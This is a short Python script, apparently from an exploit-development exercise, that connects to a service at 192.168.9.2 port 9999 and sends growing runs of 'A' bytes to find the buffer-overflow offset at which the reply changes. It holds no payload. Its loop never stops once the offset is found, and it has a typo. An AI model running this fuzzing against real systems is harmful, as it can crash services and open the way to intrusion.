import socket
crash = 500
while True:
	client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	client.connect(('192.168.9.2',9999))
	print("Tried Offset {0}".format(crash))
	pattern = client.recv(1024)
	client.send(b"A"*crash)
	pattern = client.recv(1024)
	if not b'ACCESS' in pattern:
		print("OFFSET FOUNT {0}".format(crash))
	else:
		crash+=1
